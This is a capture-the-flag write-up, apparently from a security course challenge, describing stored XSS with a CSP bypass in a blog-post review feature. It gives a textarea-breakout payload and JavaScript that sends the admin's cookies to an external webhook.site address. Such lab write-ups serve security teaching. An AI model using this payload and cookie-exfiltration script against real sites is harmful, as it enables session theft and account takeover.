# Challenge `Read my lips: No more scripts!` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Stored Cross-Site Scripting (Stored XSS), with CSP misconfiguration bypass
- Where: Where is the vulnerability present.
  - In the new blog post submission feature, more specific:
  ```js
  http://ssof2526.challenges.cwte.me:25253/posts_under_review/....
  ```
  User input is injected inside a `<textarea>` and rendered without proper escaping, in addition, CSP allows loading JavaScript from any external origin.

- Impact: What results of exploiting this vulnerability
  - Execution of attacker-controlled JavaScript in the admin’s browser
  - Exfiltration of admin cookies
  - Admin account compromise despite CSP

## Steps to reproduce

1. Host the following JavaScript code on Webhook.site (response body):
```js
fetch('https://webhook.site/67335a72-9738-4622-9218-2732119d2876',{ method:'POST', body:document.cookie })
```
2. Create a new blog post with a random title and submit a random content.
3. Click Create Post to create a post which will lead to the posts_under_review.
4. Paste the following payload in the content box:
```perl
</textarea><script src="https://webhook.site/67335a72-9738-4622-9218-2732119d2876"></script><textarea>
```
5. Click Update post to send the post for admin review.
6. When the admin reviews the post, the injected script executes.
7. The admin’s cookies are sent to the webhook.